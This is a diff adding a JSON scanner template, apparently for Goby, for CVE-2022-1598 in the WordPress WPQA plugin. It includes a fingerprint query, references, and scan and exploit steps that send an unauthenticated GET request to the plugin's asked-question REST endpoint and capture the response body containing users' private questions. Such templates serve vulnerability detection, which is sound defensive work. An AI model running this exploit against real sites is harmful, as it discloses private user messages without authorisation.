@@ -1,0 +1,98 @@
+{
+      "Name": "WordPress WPQA plugin Unauthenticated Private Message Disclosure CVE-2022-1598",
+      "Level": "1",
+      "Tags": [
+            "infoleak"
+      ],
+      "GobyQuery": "app=\"wordpress\" || product=\"WordPress\"",
+      "Description": "The plugin which is a companion to the Discy and Himer themes.",
+      "Product": "WordPress WPQA plugin",
+      "Homepage": "",
+      "Author": "",
+      "Impact": "<p>The plugin which is a companion to the Discy and Himer themes, lacks authentication in a REST API endpoint before WPQA 5.5, allowing unauthenticated users to discover private questions sent between users on the site.<br></p>",
+      "Recommendation": "",
+      "References": [
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1598",
+            "https://wpscan.com/vulnerability/0416ae2f-5670-4080-a88d-3484bb19d8c8"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/wp-json/wp/v2/asked-question",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "id\":",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/wp-json/wp/v2/asked-question",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "id\":",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|(.*)"
+                  ]
+            }
+      ],
+      "PostTime": "2022-06-06 03:30:24",
+      "GobyVersion": "1.9.325"
+}
